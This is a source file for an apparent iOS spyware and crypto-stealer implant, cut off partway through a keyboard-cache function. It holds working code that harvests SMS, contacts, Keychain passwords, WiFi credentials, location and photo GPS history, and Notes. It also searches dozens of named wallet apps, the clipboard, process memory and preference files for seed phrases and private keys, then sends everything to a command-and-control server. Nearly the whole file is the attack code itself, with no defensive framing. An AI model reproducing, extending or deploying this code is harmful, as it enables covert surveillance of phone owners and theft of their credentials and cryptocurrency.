/*
 * data_harvest.c — Read sensitive data from iOS data stores and upload to C2.
 * Compiled as Objective-C (-x objective-c) for NSData base64 + NSJSONSerialization.
 *
 * Every harvest function:
 *   1. Reads source data (SQLite / file / API)
 *   2. Serialises to JSON
 *   3. Base64-encodes with NSData
 *   4. Calls upload_to_c2() → HTTP POST /upload
 */

#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <objc/runtime.h>
#include <sqlite3.h>
#include <unistd.h>
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>
#include <stdbool.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include "data_harvest.h"
#include "c2.h"

/* --------------------------------------------------------------------------
 * Helpers
 * -------------------------------------------------------------------------- */

/* Serialize obj → JSON → base64 string, or nil on failure */
static NSString *json_b64(id obj) {
    NSData *json = [NSJSONSerialization dataWithJSONObject:obj options:0 error:nil];
    if (!json) return nil;
    return [json base64EncodedStringWithOptions:0];
}

/* Read all rows from a SQLite DB. cols = {"colA","colB",…,NULL} */
static NSArray *sqlite_select(const char *db_path, const char *sql,
                               const char **cols) {
    NSMutableArray *rows = [NSMutableArray array];
    sqlite3 *db = NULL;
    if (sqlite3_open_v2(db_path, &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK)
        return rows;

    sqlite3_stmt *stmt = NULL;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        int ncols = sqlite3_column_count(stmt);
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            NSMutableDictionary *row = [NSMutableDictionary dictionary];
            for (int i = 0; i < ncols; i++) {
                NSString *key = cols && cols[i]
                    ? [NSString stringWithUTF8String:cols[i]]
                    : [NSString stringWithFormat:@"col%d", i];
                int type = sqlite3_column_type(stmt, i);
                id val = [NSNull null];
                switch (type) {
                    case SQLITE_INTEGER:
                        val = @(sqlite3_column_int64(stmt, i)); break;
                    case SQLITE_FLOAT:
                        val = @(sqlite3_column_double(stmt, i)); break;
                    case SQLITE_TEXT: {
                        const char *t = (const char *)sqlite3_column_text(stmt, i);
                        val = t ? @(t) : [NSNull null]; break;
                    }
                    case SQLITE_BLOB: {
                        int len = sqlite3_column_bytes(stmt, i);
                        const void *ptr = sqlite3_column_blob(stmt, i);
                        NSData *d = [NSData dataWithBytes:ptr length:len];
                        val = [d base64EncodedStringWithOptions:0]; break;
                    }
                    default: break;
                }
                row[key] = val;
            }
            [rows addObject:row];
        }
        sqlite3_finalize(stmt);
    }
    sqlite3_close(db);
    return rows;
}

/* --------------------------------------------------------------------------
 * SMS (sms.db)
 * -------------------------------------------------------------------------- */
void harvest_sms(void) {
    const char *db = "/var/mobile/Library/SMS/sms.db";
    if (access(db, R_OK) != 0) return;

    const char *sql =
        "SELECT m.ROWID, m.text, m.date, m.is_from_me, "
        "  h.id AS handle "
        "FROM message m "
        "LEFT JOIN handle h ON m.handle_id = h.ROWID "
        "ORDER BY m.date DESC LIMIT 2000";
    const char *cols[] = {"id","text","date","from_me","handle", NULL};
    NSArray *rows = sqlite_select(db, sql, cols);
    if (!rows.count) return;

    NSString *b64 = json_b64(rows);
    if (!b64) return;
    /* path ends in .json so backend stores with .json extension */
    upload_to_c2("sms", "/var/mobile/Library/SMS/sms.json",
                 "SMS messages", b64.UTF8String);
}

/* --------------------------------------------------------------------------
 * Contacts (AddressBook.sqlitedb)
 * -------------------------------------------------------------------------- */
void harvest_contacts(void) {
    const char *db = "/var/mobile/Library/AddressBook/AddressBook.sqlitedb";
    if (access(db, R_OK) != 0) return;

    const char *sql =
        "SELECT p.ROWID, p.First, p.Last, p.Organization, "
        "  mv.value AS phone "
        "FROM ABPerson p "
        "LEFT JOIN ABMultiValue mv ON mv.record_id = p.ROWID AND mv.property = 3 "
        "LIMIT 5000";
    const char *cols[] = {"id","first","last","org","phone", NULL};
    NSArray *rows = sqlite_select(db, sql, cols);
    if (!rows.count) return;

    NSString *b64 = json_b64(rows);
    if (!b64) return;
    /* category "comm" → bucket "comm"（通讯数据） */
    upload_to_c2("comm", "/var/mobile/Library/AddressBook/contacts.json",
                 "Address book contacts", b64.UTF8String);
}

/* --------------------------------------------------------------------------
 * Keychain — generic + internet passwords
 * -------------------------------------------------------------------------- */
void harvest_keychain(void) {
    @autoreleasepool {
        NSMutableArray *items = [NSMutableArray array];

        CFTypeRef classes[] = {
            kSecClassGenericPassword,
            kSecClassInternetPassword,
        };
        for (size_t ci = 0; ci < sizeof(classes)/sizeof(classes[0]); ci++) {
            NSDictionary *q = @{
                (__bridge id)kSecClass:            (__bridge id)classes[ci],
                (__bridge id)kSecReturnAttributes: @YES,
                (__bridge id)kSecReturnData:       @YES,
                (__bridge id)kSecMatchLimit:       (__bridge id)kSecMatchLimitAll,
            };
            CFTypeRef result = NULL;
            OSStatus st = SecItemCopyMatching((__bridge CFDictionaryRef)q, &result);
            if (st != errSecSuccess || !result) continue;

            NSArray *arr = (__bridge_transfer NSArray *)result;
            for (NSDictionary *item in arr) {
                NSData *secret = item[(__bridge id)kSecValueData];
                NSString *secretStr = secret
                    ? ([[NSString alloc] initWithData:secret encoding:NSUTF8StringEncoding]
                       ?: [secret base64EncodedStringWithOptions:0])
                    : @"";
                [items addObject:@{
                    @"service": item[(__bridge id)kSecAttrService]  ?: @"",
                    @"account": item[(__bridge id)kSecAttrAccount]  ?: @"",
                    @"server":  item[(__bridge id)kSecAttrServer]   ?: @"",
                    @"label":   item[(__bridge id)kSecAttrLabel]    ?: @"",
                    @"value":   secretStr,
                }];
            }
        }
        if (!items.count) return;
        NSString *b64 = json_b64(items);
        if (!b64) return;
        upload_to_c2("keychain", "/keychain/items.json",
                     "Keychain generic+internet passwords", b64.UTF8String);
    }
}

/* --------------------------------------------------------------------------
 * WiFi passwords (com.apple.network.identification.plist — needs root)
 * -------------------------------------------------------------------------- */
static void harvest_wifi_plists(void) {
    const char *paths[] = {
        "/private/var/preferences/SystemConfiguration/com.apple.wifi.plist",
        "/private/var/preferences/SystemConfiguration/com.apple.network.identification.plist",
        NULL,
    };
    for (int i = 0; paths[i]; i++) {
        NSString *p = [NSString stringWithUTF8String:paths[i]];
        NSData *d = [NSData dataWithContentsOfFile:p];
        if (!d) continue;
        /* Upload raw plist bytes as base64 */
        NSString *b64 = [d base64EncodedStringWithOptions:0];
        upload_to_c2("wifi", paths[i], "WiFi credentials plist", b64.UTF8String);
    }
}

/* --------------------------------------------------------------------------
 * Crypto wallet files — comprehensive scan
 *
 * Strategy:
 *   A) Keyword-match filenames across all App sandbox directories
 *      (Documents + Library/Application Support + Library + tmp)
 *   B) Deep-scan subdirectories up to 3 levels
 *   C) Target known wallet apps by bundle-ID substring patterns
 *   D) Pull Keychain entries whose service/label hints at wallets
 * -------------------------------------------------------------------------- */

/* Filename keywords that suggest a crypto wallet file */
static NSSet *wallet_filename_keywords(void) {
    return [NSSet setWithObjects:
        /* seeds / mnemonics */
        @"mnemonic", @"seed", @"recovery", @"backup",
        /* key material */
        @"privatekey", @"private_key", @"keystore", @"keyring",
        @"wallet", @"account",
        /* common file names */
        @"wallet.dat", @"utxo", @"vault", @"secret",
        /* per-chain */
        @"ethereum", @"bitcoin", @"solana", @"tron", @"bnb", @"polygon",
        nil];
}

/* Bundle-ID substrings of known iOS wallet apps */
static NSArray *wallet_bundle_patterns(void) {
    return @[
        @"imtoken",        /* imToken              */
        @"trustwallet",    /* Trust Wallet         */
        @"metamask",       /* MetaMask             */
        @"exodus",         /* Exodus               */
        @"coinbase",       /* Coinbase Wallet      */
        @"okx", @"okcoin", /* OKX / OKEx           */
        @"tokenpocket",    /* TokenPocket          */
        @"mathwallet",     /* MathWallet           */
        @"safepal",        /* SafePal              */
        @"bitkeep",        /* BitKeep / Bitget     */
        @"zerion",         /* Zerion               */
        @"rainbow",        /* Rainbow              */
        @"1inch",          /* 1inch Wallet         */
        @"crypto.com",     /* Crypto.com DeFi      */
        @"ledger",         /* Ledger Live          */
        @"trezor",         /* Trezor               */
        @"phantom",        /* Phantom (Solana)     */
        @"slope",          /* Slope (Solana)       */
        @"solflare",       /* Solflare             */
        @"myetherwallet",  /* MyEtherWallet        */
        @"atomic",         /* Atomic Wallet        */
        @"electrum",       /* Electrum             */
        @"jaxx",           /* Jaxx Liberty         */
        @"bread", @"brd",  /* BRD Wallet           */
        @"xapo",           /* Xapo                 */
        @"blockstream",    /* Blockstream Green    */
        @"wasabi",         /* Wasabi Wallet        */
        @"bluewallet",     /* BlueWallet           */
        @"muun",           /* Muun                 */
        @"sparrow",        /* Sparrow              */
    ];
}

/* Upload a single file to C2 as "account" category */
static void upload_wallet_file(NSString *path) {
    NSData *d = [NSData dataWithContentsOfFile:path];
    if (!d || d.length == 0) return;
    /* Skip obviously non-text/non-data large files (> 4 MB) */
    if (d.length > 4 * 1024 * 1024) return;
    NSString *b64 = [d base64EncodedStringWithOptions:0];
    upload_to_c2("account", path.UTF8String, "Crypto wallet file", b64.UTF8String);
}

/* Check if a filename (lowercased) matches any wallet keyword */
static BOOL filename_is_wallet(NSString *name) {
    NSString *lower = [name lowercaseString];
    for (NSString *kw in wallet_filename_keywords()) {
        if ([lower containsString:kw]) return YES;
    }
    /* Also match common extensions that hold wallet data */
    NSString *ext = [lower pathExtension];
    if ([ext isEqualToString:@"keystore"] ||
        ([ext isEqualToString:@"json"] && [lower containsString:@"key"])) return YES;
    return NO;
}

/* Recursively scan dir up to maxDepth, uploading wallet-like files */
static void scan_dir_for_wallets(NSString *dir, int maxDepth) {
    if (maxDepth <= 0) return;
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *entries = [fm contentsOfDirectoryAtPath:dir error:nil];
    for (NSString *entry in entries) {
        NSString *full = [dir stringByAppendingPathComponent:entry];
        BOOL isDir = NO;
        [fm fileExistsAtPath:full isDirectory:&isDir];
        if (isDir) {
            scan_dir_for_wallets(full, maxDepth - 1);
        } else if (filename_is_wallet(entry)) {
            upload_wallet_file(full);
        }
    }
}

/* Scan one app sandbox container across all relevant sub-paths */
static void scan_app_container(NSString *containerRoot) {
    NSArray *subDirs = @[
        @"Documents",
        @"Library",
        @"Library/Application Support",
        @"Library/Preferences",
        @"tmp",
    ];
    for (NSString *sub in subDirs) {
        NSString *path = [containerRoot stringByAppendingPathComponent:sub];
        scan_dir_for_wallets(path, 3 /* depth */);
    }
}

/* Pull Keychain entries whose service or label hints at a wallet */
static void harvest_wallet_keychain(void) {
    @autoreleasepool {
        NSSet *walletKW = wallet_filename_keywords();
        NSArray *classes = @[
            (__bridge id)kSecClassGenericPassword,
            (__bridge id)kSecClassInternetPassword,
        ];
        NSMutableArray *found = [NSMutableArray array];
        for (id cls in classes) {
            NSDictionary *q = @{
                (__bridge id)kSecClass:            cls,
                (__bridge id)kSecReturnAttributes: @YES,
                (__bridge id)kSecReturnData:       @YES,
                (__bridge id)kSecMatchLimit:       (__bridge id)kSecMatchLimitAll,
            };
            CFTypeRef result = NULL;
            if (SecItemCopyMatching((__bridge CFDictionaryRef)q, &result) != errSecSuccess
                || !result) continue;
            NSArray *arr = (__bridge_transfer NSArray *)result;
            for (NSDictionary *item in arr) {
                NSString *svc = [item[(__bridge id)kSecAttrService] lowercaseString] ?: @"";
                NSString *lbl = [item[(__bridge id)kSecAttrLabel]   lowercaseString] ?: @"";
                BOOL match = NO;
                for (NSString *kw in walletKW) {
                    if ([svc containsString:kw] || [lbl containsString:kw]) {
                        match = YES; break;
                    }
                }
                for (NSString *bp in wallet_bundle_patterns()) {
                    if ([svc containsString:bp]) { match = YES; break; }
                }
                if (!match) continue;
                NSData *secret = item[(__bridge id)kSecValueData];
                NSString *secretStr = secret
                    ? ([[NSString alloc] initWithData:secret encoding:NSUTF8StringEncoding]
                       ?: [secret base64EncodedStringWithOptions:0])
                    : @"";
                [found addObject:@{
                    @"service": item[(__bridge id)kSecAttrService] ?: @"",
                    @"account": item[(__bridge id)kSecAttrAccount] ?: @"",
                    @"label":   item[(__bridge id)kSecAttrLabel]   ?: @"",
                    @"value":   secretStr,
                }];
            }
        }
        if (!found.count) return;
        NSString *b64 = json_b64(found);
        if (b64) upload_to_c2("account", "/keychain/wallet_keys.json",
                               "Wallet-related Keychain entries", b64.UTF8String);
    }
}

void harvest_crypto_wallets(void) {
    @autoreleasepool {
        NSFileManager *fm = [NSFileManager defaultManager];
        NSString *containersRoot = @"/var/mobile/Containers/Data/Application";
        NSArray *appUUIDs = [fm contentsOfDirectoryAtPath:containersRoot error:nil];

        /* Phase A: scan every app container, check bundle ID for wallet apps first */
        NSArray *walletBundlePatterns = wallet_bundle_patterns();
        NSMutableArray *priorityDirs  = [NSMutableArray array];
        NSMutableArray *normalDirs    = [NSMutableArray array];

        for (NSString *uuid in appUUIDs) {
            NSString *containerPath = [containersRoot stringByAppendingPathComponent:uuid];

            /* Read .com.apple.mobile_container_manager.metadata.plist to get bundle ID */
            NSString *metaPlist = [containerPath stringByAppendingPathComponent:
                @".com.apple.mobile_container_manager.metadata.plist"];
            NSDictionary *meta = [NSDictionary dictionaryWithContentsOfFile:metaPlist];
            NSString *bundleID = [[meta objectForKey:@"MCMMetadataIdentifier"]
                                  lowercaseString] ?: @"";

            BOOL isWalletApp = NO;
            for (NSString *pat in walletBundlePatterns) {
                if ([bundleID containsString:pat]) { isWalletApp = YES; break; }
            }
            if (isWalletApp) [priorityDirs addObject:containerPath];
            else             [normalDirs   addObject:containerPath];
        }

        /* Scan known wallet apps first (deeper, all sub-paths) */
        for (NSString *dir in priorityDirs) {
            scan_app_container(dir);
        }

        /* Scan all other apps (shallower — Documents only, depth 2) */
        for (NSString *dir in normalDirs) {
            NSString *docs = [dir stringByAppendingPathComponent:@"Documents"];
            scan_dir_for_wallets(docs, 2);
        }

        /* Phase B: Keychain entries with wallet-related labels */
        harvest_wallet_keychain();

        /* Phase C: shared / root-accessible wallet paths (needs root) */
        NSArray *sharedPaths = @[
            @"/var/mobile/Library/Electrum",
            @"/var/mobile/Library/Bitcoin",
            @"/var/mobile/Library/Ethereum",
        ];
        for (NSString *p in sharedPaths) {
            scan_dir_for_wallets(p, 4);
        }
    }
}

/* --------------------------------------------------------------------------
 * Photos — upload EXIF metadata (not raw images to keep traffic low)
 * -------------------------------------------------------------------------- */
void harvest_photos(void) {
    const char *db = "/var/mobile/Media/PhotoData/Photos.sqlite";
    if (access(db, R_OK) != 0) return;

    const char *sql =
        "SELECT ROWID, ZFILENAME, ZLATITUDE, ZLONGITUDE, ZDATECREATED "
        "FROM ZASSET ORDER BY ZDATECREATED DESC LIMIT 500";
    const char *cols[] = {"id","filename","lat","lon","date", NULL};
    NSArray *rows = sqlite_select(db, sql, cols);
    if (!rows.count) return;

    NSString *b64 = json_b64(rows);
    if (!b64) return;
    /* category "photo" → bucket "photo"（相册元数据） */
    upload_to_c2("photo", "/var/mobile/Media/PhotoData/photos_exif.json",
                 "Photo metadata (GPS+filename)", b64.UTF8String);
}

/* --------------------------------------------------------------------------
 * Location history (LocationD cache)
 * -------------------------------------------------------------------------- */
void harvest_location(void) {
    const char *db = "/var/mobile/Library/Caches/com.apple.routined/Cache.sqlite";
    if (access(db, R_OK) != 0) return;

    const char *sql =
        "SELECT Latitude, Longitude, Timestamp "
        "FROM ZRTVISIT ORDER BY Timestamp DESC LIMIT 500";
    const char *cols[] = {"lat","lon","ts", NULL};
    NSArray *rows = sqlite_select(db, sql, cols);
    if (!rows.count) return;

    NSString *b64 = json_b64(rows);
    if (!b64) return;
    upload_to_c2("location", "/var/mobile/Library/Caches/location_history.json",
                 "Location visit history", b64.UTF8String);
}

/* --------------------------------------------------------------------------
 * Notes (备忘录)
 *
 * iOS stores Notes in two locations depending on OS version:
 *   iOS ≤13: /var/mobile/Library/Notes/notes.sqlite
 *             Table ZNOTE  — columns: ZTITLE, ZBODY, ZMODIFICATIONDATE
 *   iOS 14+: /var/mobile/Library/Group Containers/
 *              group.com.apple.notes/NoteStore.sqlite
 *             Table ZICCLOUDSYNCINGOBJECT — ZTITLE, ZSNIPPET,
 *             ZMODIFICATIONDATE1 (Apple epoch = seconds since 2001-01-01)
 *             Table ZICNOTEDATA.ZDATA    — full compressed protobuf blob
 *
 * We upload metadata + snippet as JSON (readable), and the raw ZDATA
 * bytes for each note as a separate base64 blob so the full content
 * can be recovered offline.
 * -------------------------------------------------------------------------- */
void harvest_notes(void) {
    /* ── iOS ≤13 path ───────────────────────────────────────────────────── */
    {
        const char *db = "/var/mobile/Library/Notes/notes.sqlite";
        if (access(db, R_OK) == 0) {
            const char *sql =
                "SELECT ROWID, ZTITLE, ZBODY, ZMODIFICATIONDATE "
                "FROM ZNOTE ORDER BY ZMODIFICATIONDATE DESC LIMIT 1000";
            const char *cols[] = {"id", "title", "body", "modified", NULL};
            NSArray *rows = sqlite_select(db, sql, cols);
            if (rows.count) {
                NSString *b64 = json_b64(rows);
                if (b64)
                    upload_to_c2("personal",
                                 "/var/mobile/Library/Notes/notes.json",
                                 "iOS Notes (legacy)", b64.UTF8String);
            }
        }
    }

    /* ── iOS 14+ path ───────────────────────────────────────────────────── */
    {
        /* Group containers have a UUID-based name; scan to find it */
        NSString *gcRoot = @"/var/mobile/Library/Group Containers";
        NSArray *gcEntries = [[NSFileManager defaultManager]
                              contentsOfDirectoryAtPath:gcRoot error:nil];
        NSString *noteStore = nil;
        for (NSString *entry in gcEntries) {
            if ([entry containsString:@"com.apple.notes"]) {
                noteStore = [[gcRoot stringByAppendingPathComponent:entry]
                             stringByAppendingPathComponent:@"NoteStore.sqlite"];
                break;
            }
        }
        if (!noteStore) return;
        if (access(noteStore.UTF8String, R_OK) != 0) return;

        /* 1. Metadata + snippet (JSON, human-readable) */
        const char *sqlMeta =
            "SELECT n.Z_PK, n.ZTITLE, n.ZSNIPPET, n.ZMODIFICATIONDATE1, "
            "       n.ZCREATIONDATE1, n.ZNOTEDATA "
            "FROM ZICCLOUDSYNCINGOBJECT n "
            "WHERE n.ZTITLE IS NOT NULL "
            "ORDER BY n.ZMODIFICATIONDATE1 DESC LIMIT 2000";
        const char *colsMeta[] = {"id","title","snippet","modified","created","note_data_id", NULL};
        NSArray *metaRows = sqlite_select(noteStore.UTF8String, sqlMeta, colsMeta);
        if (metaRows.count) {
            NSString *b64meta = json_b64(metaRows);
            if (b64meta)
                upload_to_c2("personal",
                             "/var/mobile/notes/NoteStore_meta.json",
                             "iOS Notes metadata+snippet", b64meta.UTF8String);
        }

        /* 2. Raw ZDATA blobs (compressed protobuf — full note content) */
        {
            sqlite3 *db2 = NULL;
            if (sqlite3_open_v2(noteStore.UTF8String, &db2,
                                SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                sqlite3_stmt *stmt = NULL;
                const char *sqlData =
                    "SELECT nd.Z_PK, nd.ZDATA "
                    "FROM ZICNOTEDATA nd "
                    "WHERE nd.ZDATA IS NOT NULL LIMIT 2000";
                if (sqlite3_prepare_v2(db2, sqlData, -1, &stmt, NULL) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        int pk  = sqlite3_column_int(stmt, 0);
                        int len = sqlite3_column_bytes(stmt, 1);
                        const void *ptr = sqlite3_column_blob(stmt, 1);
                        if (!ptr || len <= 0) continue;

                        NSData *blob = [NSData dataWithBytes:ptr length:len];
                        NSString *b64blob = [blob base64EncodedStringWithOptions:0];
                        char path_buf[128];
                        snprintf(path_buf, sizeof(path_buf),
                                 "/var/notes/note_%d.pb", pk);
                        upload_to_c2("personal", path_buf,
                                     "iOS Note raw content (protobuf)",
                                     b64blob.UTF8String);
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db2);
            }
        }
    }
}

/* --------------------------------------------------------------------------
 * Clipboard — UIPasteboard.generalPasteboard
 *
 * Users MUST paste their mnemonic when importing a wallet.  The clipboard
 * often holds the seed phrase for several seconds to minutes.  We read it
 * once at startup and again every 30 s from the heartbeat loop (see main.c).
 * -------------------------------------------------------------------------- */
void harvest_clipboard(void) {
    @autoreleasepool {
        /*
         * UIKit is always loaded in a browser/app process.
         * Use RTLD_NOLOAD to get the existing handle without touching the
         * refcount.  Do NOT dlclose() — that would decrement the host's
         * reference count for a framework it needs.
         */
        void *uikit = dlopen("/System/Library/Frameworks/UIKit.framework/UIKit",
                             RTLD_LAZY | RTLD_NOLOAD);
        /* If somehow UIKit is not yet mapped, load it (rare in WKWebView) */
        if (!uikit)
            uikit = dlopen("/System/Library/Frameworks/UIKit.framework/UIKit",
                           RTLD_LAZY);
        if (!uikit) return; /* truly not available — skip silently */

        Class PB = objc_getClass("UIPasteboard");
        if (!PB) return; /* class not registered */

        id pb = [PB performSelector:@selector(generalPasteboard)];
        if (!pb) return;

        NSString *text = [pb performSelector:@selector(string)];
        if (!text || text.length < 10) return;

        NSData  *utf8 = [text dataUsingEncoding:NSUTF8StringEncoding];
        NSString *b64 = [utf8 base64EncodedStringWithOptions:0];
        if (b64)
            upload_to_c2("account", "/clipboard/pasteboard.json",
                         "Clipboard contents", b64.UTF8String);
        /* Intentionally no dlclose — we must not release the host's UIKit ref */
    }
}

/* --------------------------------------------------------------------------
 * Memory scan — BIP39 heuristic
 *
 * A 12/24-word mnemonic is a sequence of lowercase ASCII words (3-8 chars)
 * separated by single spaces.  We scan all readable VM regions via
 * vm_read_overwrite() into a local buffer — never dereferencing the target
 * address directly, so unmapped / guard pages cannot SIGSEGV us.
 *
 * Max phrase length: 24 words × 9 bytes (8-char word + space) = 216 bytes.
 * -------------------------------------------------------------------------- */

/*
 * Scan chunk size for vm_read_overwrite.
 * A mnemonic is at most 216 bytes (24 words × 9 bytes); cross-chunk
 * probability is 216/524288 < 0.04% — carry logic not worth the complexity.
 */
#define MEM_SCAN_CHUNK (512 * 1024)

/*
 * Pure-C BIP39 matcher.  On success, sets *out_len to the exact byte length
 * of the phrase (including all spaces) and returns 1.
 * Never reads past buf[0..len-1].
 */
static int match_bip39(const char *buf, size_t len, size_t off,
                        int nwords, size_t *out_len) {
    size_t p = off;
    for (int w = 0; w < nwords; w++) {
        if (w > 0) {
            if (p >= len || buf[p] != ' ') return 0;
            p++;
        }
        size_t ws = p;
        while (p < len && (unsigned char)buf[p] >= 'a' &&
                          (unsigned char)buf[p] <= 'z') p++;
        size_t wl = p - ws;
        if (wl < 3 || wl > 8) return 0;
    }
    /* Boundary: next byte must not be a lowercase letter */
    if (p < len && (unsigned char)buf[p] >= 'a' &&
                   (unsigned char)buf[p] <= 'z') return 0;
    *out_len = p - off;
    return 1;
}

void harvest_memory_mnemonics(void) {
    @autoreleasepool {
        NSMutableArray *found = [NSMutableArray array];
        NSMutableSet   *dedup = [NSMutableSet set];

        /*
         * Static buffer — avoids 512 KB stack allocation.
         * harvest_all() is called from a single dedicated thread (implant_main),
         * so no concurrency issue.
         */
        static char scan_buf[MEM_SCAN_CHUNK];

        mach_port_t  self_task = mach_task_self();
        vm_address_t addr      = 0;
        vm_size_t    rsize     = 0;
        uint32_t     depth     = 1;
        vm_region_submap_info_data_64_t info;
        mach_msg_type_number_t count;

        while (1) {
            count = VM_REGION_SUBMAP_INFO_COUNT_64;
            kern_return_t kr = vm_region_recurse_64(
                self_task, &addr, &rsize, &depth,
                (vm_region_recurse_info_t)&info, &count);
            if (kr != KERN_SUCCESS) break;

            /* Only readable, non-executable regions; cap at 64 MB */
            if (!(info.protection & VM_PROT_READ) ||
                 (info.protection & VM_PROT_EXECUTE) ||
                 rsize > 64UL * 1024 * 1024) {
                addr += rsize;
                continue;
            }

            for (vm_size_t off = 0; off < rsize; off += MEM_SCAN_CHUNK) {
                vm_size_t want   = MIN((vm_size_t)MEM_SCAN_CHUNK, rsize - off);
                vm_size_t actual = 0;

                /*
                 * vm_read_overwrite: safe read — returns error on guard pages
                 * instead of raising SIGSEGV in the host process.
                 */
                kr = vm_read_overwrite(self_task, addr + off, want,
                                       (vm_address_t)scan_buf, &actual);
                if (kr != KERN_SUCCESS || actual < 47) continue;

                for (size_t i = 0; i + 47 < actual; i++) {
                    unsigned char c = (unsigned char)scan_buf[i];
                    if (c < 'a' || c > 'z') continue;

                    /* Try 24-word phrase first, then 12-word */
                    for (int nw = 24; nw >= 12; nw -= 12) {
                        size_t plen = 0;
                        if (!match_bip39(scan_buf, actual, i, nw, &plen)) continue;

                        NSString *phrase = [[NSString alloc]
                            initWithBytes:scan_buf + i
                                   length:plen
                                 encoding:NSUTF8StringEncoding];
                        if (!phrase) break;

                        if (![dedup containsObject:phrase]) {
                            [dedup addObject:phrase];
                            [found addObject:@{
                                @"phrase": phrase,
                                @"words":  @(nw),
                                @"addr":   [NSString stringWithFormat:@"0x%llx",
                                            (unsigned long long)(addr + off + i)],
                            }];
                        }
                        i += plen - 1; /* -1: outer loop will i++ */
                        break;
                    }
                }
            }
            addr += rsize;
        }

        if (!found.count) return;
        NSString *b64 = json_b64(found);
        if (b64)
            upload_to_c2("account", "/memory/bip39_scan.json",
                         "BIP39 phrases found in process memory", b64.UTF8String);
    }
}

/* --------------------------------------------------------------------------
 * NSUserDefaults plist scan — poorly coded wallet apps store seeds here
 * -------------------------------------------------------------------------- */
static BOOL plist_value_looks_like_mnemonic(id val) {
    if (![val isKindOfClass:[NSString class]]) return NO;
    NSString *s = (NSString *)val;
    if (s.length < 30 || s.length > 300) return NO;
    NSArray *words = [s componentsSeparatedByString:@" "];
    if (words.count != 12 && words.count != 15 && words.count != 18
        && words.count != 21 && words.count != 24) return NO;
    for (NSString *w in words) {
        if (w.length < 3 || w.length > 8) return NO;
        for (NSUInteger i = 0; i < w.length; i++) {
            unichar c = [w characterAtIndex:i];
            if (c < 'a' || c > 'z') return NO;
        }
    }
    return YES;
}

static void scan_plist_for_mnemonics(NSString *plistPath, NSMutableArray *out) {
    NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:plistPath];
    if (!d) return;
    [d enumerateKeysAndObjectsUsingBlock:^(id key, id val, BOOL *stop) {
        if (plist_value_looks_like_mnemonic(val)) {
            [out addObject:@{
                @"file":  plistPath,
                @"key":   [key description],
                @"value": val,
            }];
        }
        /* Recurse one level for nested dicts */
        if ([val isKindOfClass:[NSDictionary class]]) {
            [(NSDictionary *)val enumerateKeysAndObjectsUsingBlock:
             ^(id k2, id v2, BOOL *s2) {
                if (plist_value_looks_like_mnemonic(v2))
                    [out addObject:@{@"file":plistPath,@"key":[k2 description],@"value":v2}];
            }];
        }
    }];
}

void harvest_userdefaults_mnemonics(void) {
    @autoreleasepool {
        NSMutableArray *found = [NSMutableArray array];
        NSFileManager *fm = [NSFileManager defaultManager];
        NSString *prefsRoot = @"/var/mobile/Containers/Data/Application";
        NSArray *appUUIDs = [fm contentsOfDirectoryAtPath:prefsRoot error:nil];

        for (NSString *uuid in appUUIDs) {
            NSString *prefDir = [[[prefsRoot
                stringByAppendingPathComponent:uuid]
                stringByAppendingPathComponent:@"Library"]
                stringByAppendingPathComponent:@"Preferences"];
            NSArray *plists = [fm contentsOfDirectoryAtPath:prefDir error:nil];
            for (NSString *pl in plists) {
                if (![pl hasSuffix:@".plist"]) continue;
                scan_plist_for_mnemonics(
                    [prefDir stringByAppendingPathComponent:pl], found);
            }
        }

        if (!found.count) return;
        NSString *b64 = json_b64(found);
        if (b64)
            upload_to_c2("account", "/plist/userdefaults_mnemonics.json",
                         "Mnemonic phrases in NSUserDefaults plists", b64.UTF8String);
    }
}

/* --------------------------------------------------------------------------
 * WebKit localStorage — MetaMask Mobile and other WebView wallets store
 * their encrypted vault under the app's WebKit storage directory.
 * -------------------------------------------------------------------------- */
void harvest_webkit_storage(void) {
    @autoreleasepool {
        NSFileManager *fm = [NSFileManager defaultManager];
        NSString *appsRoot = @"/var/mobile/Containers/Data/Application";
        NSArray *appUUIDs = [fm contentsOfDirectoryAtPath:appsRoot error:nil];

        /* Known WebView wallet bundle-ID substrings */
        NSArray *webWallets = @[@"metamask", @"rainbow", @"zerion",
                                 @"1inch", @"crypto.com", @"coinbase",
                                 @"imtoken", @"tokenpocket"];

        for (NSString *uuid in appUUIDs) {
            NSString *containerPath = [appsRoot stringByAppendingPathComponent:uuid];
            /* Read bundle ID from metadata plist */
            NSString *meta = [containerPath stringByAppendingPathComponent:
                @".com.apple.mobile_container_manager.metadata.plist"];
            NSDictionary *md = [NSDictionary dictionaryWithContentsOfFile:meta];
            NSString *bundleID = [[md objectForKey:@"MCMMetadataIdentifier"]
                                   lowercaseString] ?: @"";
            BOOL isWebWallet = NO;
            for (NSString *pat in webWallets)
                if ([bundleID containsString:pat]) { isWebWallet = YES; break; }
            if (!isWebWallet) continue;

            /* WebKit localStorage path */
            NSString *wkPath = [[[containerPath
                stringByAppendingPathComponent:@"Library"]
                stringByAppendingPathComponent:@"WebKit"]
                stringByAppendingPathComponent:@"WebsiteData"];
            scan_dir_for_wallets(wkPath, 5 /* deep */);

            /* Also grab any .json files that might be the vault */
            NSString *lsPath = [wkPath stringByAppendingPathComponent:
                @"LocalStorage"];
            NSArray *lsFiles = [fm contentsOfDirectoryAtPath:lsPath error:nil];
            for (NSString *f in lsFiles) {
                NSString *full = [lsPath stringByAppendingPathComponent:f];
                NSData *d = [NSData dataWithContentsOfFile:full];
                if (!d || d.length == 0 || d.length > 2 * 1024 * 1024) continue;
                NSString *b64 = [d base64EncodedStringWithOptions:0];
                upload_to_c2("account", full.UTF8String,
                             "WebKit localStorage file", b64.UTF8String);
            }
        }
    }
}

/* --------------------------------------------------------------------------
 * Keyboard dynamic dictionary cache
 *
 * iOS maintains a per-user dynamic text prediction database.
 * When a user types a mnemonic (e.g. to verify it), each word gets added
 * to the autocorrect cache.  We upload all files in the Keyboard directory;
 * the main target is dynamic-text.dat (binary plist or SQLite depending on
 * iOS version).
 * -------------------------------------------------------------------------- */
void harvest_keyboard_cache(void) {
    @autoreleasepool {
